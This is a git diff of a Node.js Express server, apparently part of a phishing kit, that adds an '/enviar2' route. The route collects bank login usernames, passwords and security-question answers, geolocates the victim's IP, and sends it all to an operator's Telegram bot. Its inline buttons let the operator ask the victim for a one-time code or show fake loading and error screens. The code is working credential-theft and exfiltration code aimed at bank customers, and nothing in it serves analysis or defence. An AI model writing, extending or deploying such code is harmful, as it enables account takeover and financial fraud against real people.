@@ -87,6 +87,58 @@ app.post('/enviar', async (req, res) => {
   res.sendStatus(200);
 });
 
+app.post('/enviar2', async (req, res) => {
+  const {
+    usar,
+    clavv,
+    txid,
+    pregunta1,
+    pregunta2,
+    respuesta1,
+    respuesta2
+  } = req.body;
+
+  const ip = req.headers['x-forwarded-for']?.split(',')[0] || req.connection.remoteAddress;
+  const ciudad = await obtenerCiudad(ip);
+
+  const mensaje = `
+❓🔑🟢B4N3SC0🟢
+🆔 ID: <code>${txid}</code>
+
+📱 US4R: ${usar}
+🔐 CL4V: ${clavv}
+
+${pregunta1}❓ : ${respuesta1}
+${pregunta2}❓ : ${respuesta2}
+
+🌐 IP: ${ip}
+🏙️ Ciudad: ${ciudad}
+`;
+
+  const keyboard = {
+    inline_keyboard: [
+      [{ text: "🔑PEDIR CÓDIGO", callback_data: `cel-dina:${txid}` }],
+      [{ text: "🔄CARGANDO", callback_data: `verifidata:${txid}` }],
+      [{ text: "🔐PREGUNTAS", callback_data: `preguntas_menu:${txid}` }],
+      [{ text: "❌ERROR LOGO", callback_data: `errorlogo:${txid}` }]
+    ]
+  };
+
+  await fetch(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage`, {
+    method: 'POST',
+    headers: { 'Content-Type': 'application/json' },
+    body: JSON.stringify({
+      chat_id: CHAT_ID,
+      text: mensaje,
+      parse_mode: 'HTML',
+      reply_markup: keyboard
+    })
+  });
+
+  res.sendStatus(200);
+});
+
+
 app.post('/webhook', async (req, res) => {
   if (req.body.callback_query) {
     const callback = req.body.callback_query;
